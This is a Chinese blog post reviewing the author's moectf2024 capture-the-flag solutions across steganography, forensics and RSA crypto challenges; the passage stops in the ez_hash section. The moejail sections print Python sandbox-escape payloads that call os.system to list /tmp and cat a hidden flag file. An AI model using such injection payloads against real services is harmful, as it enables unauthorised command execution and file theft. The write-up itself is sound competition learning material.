Blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/favicon.ico"}}}</script></head><body id=top><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="0raN9e's Blog (Alt + H)">0raN9e's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/ title=首页><span>首页</span></a></li><li><a href=http://localhost:1313/archives/ title=归档><span>归档</span></a></li><li><a href=http://localhost:1313/tags/ title=标签><span>标签</span></a></li><li><a href=http://localhost:1313/search/ title=搜索><span>搜索</span></a></li><li><a href=http://localhost:1313/about/ title=关于><span>关于</span></a></li><li><a href=http://localhost:1313/links/ title=友链><span>友链</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><span title='2024-10-12 00:00:00 +0000 UTC'>October 12, 2024</span>&nbsp;·&nbsp;<span>19 min</span><h1 class=post-title>moectf2024</h1></header><div class=pm-layout><div class=pm-main><div class=post-content><p>个人排名第25，后期就没怎么打了，复盘整理一下。</p><h1 id=0基础入门>0基础入门</h1><p>看完pdf，在群里输入识别码，获得flag</p><p><img alt=1 loading=lazy src=/posts/ctf/moectf2024/1.png></p><h1 id=安全杂项>安全杂项</h1><h2 id=signin>signin</h2><p>登入网址，按照要求，给luo选择缺勤，其他签到</p><p>注意：完成所有要求再提交</p><h2 id=罗小黑战记>罗小黑战记</h2><p>打开发现是GIF，帧数藏图片，用工具提取内容</p><img src=a.jpeg alt=a style=zoom:50%>
<img src=b.jpeg alt=b style=zoom:50%>
<img src=c.png alt=c style=zoom:75%><p>最后扫码得到 <strong>moectf{y0uu6r3th3m0st3r1nth1sf13ld}</strong></p><h2 id=杂项入门指北>杂项入门指北</h2><p>得到海豹图片，尝试多种未果，注意到图片观察。其实有一段莫斯密码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-markdown data-lang=markdown><span style=display:flex><span>.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .
</span></span></code></pre></div><p><img alt=haibao loading=lazy src=/posts/ctf/moectf2024/haibao.png></p><p><strong>moectf{H4VE_A_G00D_T1ME}</strong></p><h2 id=ez_f5>ez_F5</h2><p>头一次见这种隐写</p><p>先看到属性里面有编码，base32解密得到<code>no_password</code>,010打开进行分析，在里面看到提示</p><p><img alt=F5 loading=lazy src=/posts/ctf/moectf2024/F5.png></p><p>网上搜索一下是F5隐写，下载工具，上面的是密码得到flag</p><p><img alt=F5-1 loading=lazy src=/posts/ctf/moectf2024/F5-1.png></p><p><strong>moectf{F5_15_s0_lntere5t1n9}</strong></p><h2 id=so-many-m>so many &rsquo;m'</h2><p>字频统计的题目，写一个脚本出</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> collections <span style=color:#f92672>import</span> Counter
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>char_frequency_sort</span>(text):
</span></span><span style=display:flex><span>    <span style=color:#75715e># 统计每个字符的频率</span>
</span></span><span style=display:flex><span>    frequency <span style=color:#f92672>=</span> Counter(text)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 按照频率从高到低排序，如果频率相同则按字典序排序</span>
</span></span><span style=display:flex><span>    sorted_chars <span style=color:#f92672>=</span> sorted(frequency<span style=color:#f92672>.</span>items(), key<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> x: (<span style=color:#f92672>-</span>x[<span style=color:#ae81ff>1</span>], x[<span style=color:#ae81ff>0</span>]))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># 拼接成排序后的字符序列</span>
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(char <span style=color:#66d9ef>for</span> char, count <span style=color:#f92672>in</span> sorted_chars)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> result
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 测试输入</span>
</span></span><span style=display:flex><span>text <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;a!{ivlotzkEm{CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC}sii}tkb}ugCD{zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC}eot#dcf{ec@ccgqpfqMycysMuuou!en#{g0cDmoyxTCMgt{joT{jnl0rhoklCe{n0CnxprydeaTg0r{avkEjckjEsxhaohs{Trbkr!ffqip444uwrc}nnevgtCT{jCipogtipzdeDiqsy44rMfj{MzCw#qwg{T4m{cuk!hwuncxdmddeurtsojakrjC#vTDd}0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq}kcf#Mpcam{mml4i4mpDnedamcwtC0nem{mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu{poeTEhD!u0anvTTTbbi</span><span style=color:#e6db74>{q}</span><span style=color:#e6db74>zapcksMifDlovoeac@{0keh0dg{Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE}eoD{xcMnoCuebu0otdusiDknfvo0{fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a}0ixeEktws}pMCfCigaTafg}ffssmwwuTkTuls0{M@c4e@{D{tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo</span><span style=color:#e6db74>{et4kcCpcgcT}</span><span style=color:#e6db74>vD}m!g4{E0!Mol0fpo!{srT0pf{cMuCx0bp</span><span style=color:#e6db74>{ftTmExcrn}</span><span style=color:#e6db74>0etonez!@C4tfa4aM00siztb@fomfD#{#tMbo@jgb4CM0dEk0tea4aMCafn&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 获取结果并输出</span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> char_frequency_sort(text)
</span></span><span style=display:flex><span>print(result)
</span></span></code></pre></div><h2 id=捂住一只耳>捂住一只耳</h2><p>wav音频，先用audi代开，没发现波纹图的问题，大约在1min的时候会有数字读写，看了hint才猜出，按键盘上字母对应的列行，如63就是字母第六列第三行，即n</p><pre tabindex=0><code>63 31 43 31 41 52 31 51 71 101
</code></pre><p>最后的flag为moectf{nevergetup}</p><h2 id=abnormal-lag>Abnormal lag</h2><p>这里用adu打开发现多频图里面有内容，需要进行观察得到flag，友情提醒的是字符只有a-f和数字</p><p><img alt=lag1 loading=lazy src=/posts/ctf/moectf2024/lag1.png></p><p><img alt=lag2 loading=lazy src=/posts/ctf/moectf2024/lag2.png></p><p>尝试后得到moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}</p><h2 id=moejail_lv1>moejail_lv1</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>__import__<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)</span>.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;ls -al /tmp&#39;</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>读取文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>__import__<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;os&#39;</span><span style=color:#f92672>)</span>.system<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;cat /tmp/.therealflag_*&#39;</span><span style=color:#f92672>)</span>
</span></span></code></pre></div><p>得到flag</p><h2 id=moejail_lv2>moejail_lv2</h2><p>用1一样的第一条先查看一下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>__import__(<span style=color:#e6db74>&#39;os&#39;</span>)<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;ls -al /tmp&#39;</span>)
</span></span></code></pre></div><p>发现root权限可以看</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>print(open(<span style=color:#e6db74>&#39;/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918&#39;</span>)<span style=color:#f92672>.</span>read())
</span></span></code></pre></div><h2 id=moejail_lv3>moejail_lv3</h2><p>试了一下lv3,用2的代码可以打通，就不多赘述了</p><h2 id=the-upside-and-down>The upside and down</h2><p>010发现是逆转，写个脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># # 以二进制模式读取文件内容</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;C:/Users/30226/Desktop/a.txt&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>     content <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#75715e># 反转文件内容</span>
</span></span><span style=display:flex><span>reversed_content <span style=color:#f92672>=</span> content[::<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;C:/Users/30226/Desktop/new.txt&#39;</span>, <span style=color:#e6db74>&#39;wb&#39;</span>) <span style=color:#66d9ef>as</span> new_file:
</span></span><span style=display:flex><span>      new_file<span style=color:#f92672>.</span>write(reversed_content)
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;new.txt&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> file:
</span></span><span style=display:flex><span>    lines <span style=color:#f92672>=</span> file<span style=color:#f92672>.</span>readlines()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>lines <span style=color:#f92672>=</span> [line <span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> lines <span style=color:#66d9ef>if</span> line<span style=color:#f92672>.</span>strip()]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将过滤后的内容写回文件</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#39;new.txt&#39;</span>, <span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> file:
</span></span><span style=display:flex><span>    file<span style=color:#f92672>.</span>writelines(lines)
</span></span></code></pre></div><p>扫一下得到flag</p><p><img alt=new loading=lazy src=/posts/ctf/moectf2024/new.png></p><p><code>https://balabala_towards:moectf{Fri3nds_d0n't_lie!}//</code></p><h2 id=the_secret_of_snowball>the_secret_of_snowball</h2><p>010打开开头改为FFD8，</p><p>得到第一段</p><p>第二段在010底部base64解密拼接得到flag</p><h2 id=解不完的压缩包>解不完的压缩包</h2><p>先写脚本得到最后一层压缩包</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> zipfile
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>extract_zip_file</span>(zip_name, output_dir):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> zipfile<span style=color:#f92672>.</span>ZipFile(zip_name, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> zipf:
</span></span><span style=display:flex><span>        zipf<span style=color:#f92672>.</span>extractall(output_dir)
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
</span></span><span style=display:flex><span>    output_dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;.&#34;</span>  <span style=color:#75715e># 使用当前目录进行解压</span>
</span></span><span style=display:flex><span>    prev_extracted_file <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>999</span>, <span style=color:#ae81ff>0</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        zip_name <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>.zip&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>exists(zip_name):
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Error: The file &#39;</span><span style=color:#e6db74>{</span>zip_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; does not exist.&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># Extract the current zip file</span>
</span></span><span style=display:flex><span>        extract_zip_file(zip_name, output_dir)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> prev_extracted_file:
</span></span><span style=display:flex><span>            <span style=color:#75715e># Delete the previously extracted zip file</span>
</span></span><span style=display:flex><span>            os<span style=color:#f92672>.</span>remove(prev_extracted_file)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        prev_extracted_file <span style=color:#f92672>=</span> zip_name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;All zip files have been extracted and processed.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></div><p>根据压缩包名称的提示，crc碰撞</p><p>利用Zipcrack.py进行爆破</p><p>得到key <code>m:#P7j0</code></p><p>最后解密得到flag</p><p><code>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</code></p><h2 id=每人至少300份>每人至少300份</h2><p>一直在想脚本没看图片，然后利用word文档就行了简单的拼接，扫码得到一串字符,分析一会后发现了是base58加密得到了flag这题之后会有修复题</p><p><img alt=300问卷 loading=lazy src=/posts/ctf/moectf2024/300%E9%97%AE%E5%8D%B7.png></p><p>balabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??</p><p>key里面的内容进行解密得到flag.</p><h2 id=readme>readme</h2><p><code>/proc/self/fd/3</code></p><h2 id=find-it>Find It</h2><p>orz这题历时写了很长时间，总结就是其实和图片没什么关系，直接看hint</p><p>做题流程：豆包搜索西安带"的"的幼儿园，跳出了吉的堡幼儿园，简单的百度地图搜一下几个位置，发现有个小区有两个吉的堡幼儿园，最后拼写的就是moectf{ji_di_bao_you_er_yuan}</p><h2 id=ez_forensics>ez_Forensics</h2><p>取证这一块我没这么了解过</p><p>按流程正常输入一些内容就行(毕竟这个比较简单)</p><p>拖入虚拟机使用vol</p><p>常见的先看看什么镜像</p><p><code>vol.py -f ../flag.raw imageinfo</code></p><p>得到镜像折后可以看一下进程</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 pslist</code></p><p>可以注意到cmd.exe，根据题目的提示，我们需要得到cmd里面的flag</p><p>进行cmdscan扫描</p><p><code>vol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan</code></p><p>得到了flag</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>CommandProcess: conhost.exe Pid: <span style=color:#ae81ff>2268</span>
</span></span><span style=display:flex><span>CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset
</span></span><span style=display:flex><span>CommandCount: <span style=color:#ae81ff>3</span> LastAdded: <span style=color:#ae81ff>2</span> LastDisplayed: <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>FirstCommand: <span style=color:#ae81ff>0</span> CommandCountMax: <span style=color:#ae81ff>50</span>
</span></span><span style=display:flex><span>ProcessHandle: 0x60
</span></span><span style=display:flex><span>Cmd <span style=color:#75715e>#0 @ 0x330410: echo moectf{WWBGY-TLVC5-XKYBZ} &gt; flag.txt</span>
</span></span><span style=display:flex><span>Cmd <span style=color:#75715e>#1 @ 0x30cec0: echo SJW7O^%gt8 &gt; flag.txt</span>
</span></span><span style=display:flex><span>Cmd <span style=color:#75715e>#2 @ 0x3350b0: del flag.txt</span>
</span></span><span style=display:flex><span>**************************************************
</span></span></code></pre></div><h2 id=ctfer2077>ctfer2077①</h2><p>先扫看看发现没有东西，用steg看一下，发现有一处有一串内容，data分析一下得到flag</p><p><img alt=ctfer2077-1 loading=lazy src=/posts/ctf/moectf2024/ctfer2077-1.png></p><p>moectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}</p><h2 id=ctfer2077-1>ctfer2077②</h2><p>加密卷用veracrpt进行解密，然后使用DiskGenius进行恢复文件得到一段内容，打开发现没有明显的内容，估计是被删了，去修复一下。有一个小鹤.txt的文件，内容是</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>ulpb vfde hfyz yisi buuima
</span></span><span style=display:flex><span>key jqui xxmm vedrhx de qrpb xnxp
</span></span><span style=display:flex><span>ulpb ui veyh dazide
</span></span></code></pre></div><p>经过分析是双拼打的字，进行简单分析得到key</p><p>shuangpinshizheyangdazide</p><p>加个moectf就是flag</p><h2 id=ctfer2077-2>ctfer2077③</h2><p>流量包导出内容，然后upload文件利用foremost解开得到压缩包，解压得到一些文件。</p><p>有个gif动图隐约能看见有字提取一下内容，得到key:C5EZFsC6</p><p>正常用aud打开发现没什么内容，注意是MP3文件，尝试用MP3stego解密</p><p><img alt=mp3 loading=lazy src=/posts/ctf/moectf2024/mp3.png></p><p>得到了文件，是brainfuck转text的内容，得到了字符串H5gHWM9b</p><p>解开压缩包是3个txt文件，缩小观察是福尔摩斯小人，上图片</p><p><img alt=福尔摩斯 loading=lazy src=/posts/ctf/moectf2024/%E7%A6%8F%E5%B0%94%E6%91%A9%E6%96%AF.png></p><p>挨个对应然后输入就是以下字符串，最后套个moectf{}</p><p>people_dancing_happily</p><h1 id=现代密码学><strong>现代密码学</strong></h1><h2 id=现代密码学入门指北>现代密码学入门指北</h2><p>根据文本写脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes, inverse
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的参数</span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>197380555956482914197022424175976066223</span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#ae81ff>205695522197318297682903544013139543071</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>40600296529065757616876034307502386207424439675894291036278463517602256790833</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>36450632910287169149899281952743051320560762944710752155402435752196566406306</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 φ(n)</span>
</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算解密指数 d</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密密文 c 得到明文 m</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 将明文 m 转换为字节</span>
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 输出解密的结果</span>
</span></span><span style=display:flex><span>print(flag<span style=color:#f92672>.</span>decode())
</span></span></code></pre></div><h2 id=signin-1>Signin</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> inverse, long_to_bytes, GCD
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sympy <span style=color:#f92672>import</span> symbols, solve
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 先定义已知的变量</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746</span>
</span></span><span style=display:flex><span>pq <span style=color:#f92672>=</span> <span style=color:#ae81ff>18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462</span>
</span></span><span style=display:flex><span>qp <span style=color:#f92672>=</span> <span style=color:#ae81ff>18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903</span>
</span></span><span style=display:flex><span>p_q <span style=color:#f92672>=</span> <span style=color:#ae81ff>279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 恢复 p 和 q</span>
</span></span><span style=display:flex><span>x <span style=color:#f92672>=</span> symbols(<span style=color:#e6db74>&#39;x&#39;</span>)
</span></span><span style=display:flex><span>equation <span style=color:#f92672>=</span> x<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span> <span style=color:#f92672>-</span> p_q<span style=color:#f92672>*</span>x <span style=color:#f92672>+</span> n
</span></span><span style=display:flex><span>solutions <span style=color:#f92672>=</span> solve(equation, x)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> int(solutions[<span style=color:#ae81ff>0</span>])
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> int(solutions[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算 φ(n)</span>
</span></span><span style=display:flex><span>phi_n <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 计算私钥 d</span>
</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> inverse(e, phi_n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 解密消息</span>
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n)
</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Recovered flag: </span><span style=color:#e6db74>{</span>flag<span style=color:#f92672>.</span>decode()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span></code></pre></div><h2 id=big-and-small>Big and small</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> long_to_bytes
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 给定的c, e, n</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 使用 gmpy2 提供的立方根计算函数</span>
</span></span><span style=display:flex><span>m, exact <span style=color:#f92672>=</span> gmpy2<span style=color:#f92672>.</span>iroot(c, e)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># 如果立方根是精确的，我们可以直接获取明文</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> exact:
</span></span><span style=display:flex><span>    flag <span style=color:#f92672>=</span> long_to_bytes(m)
</span></span><span style=display:flex><span>    print(flag)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;密文可能无法直接解密，或者立方根不精确。&#34;</span>)
</span></span></code></pre></div><h2 id=ez_hash>ez_hash</h2><p>给的提示其实因为是qq号所以都是数字，直接爆破就好</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> sha256
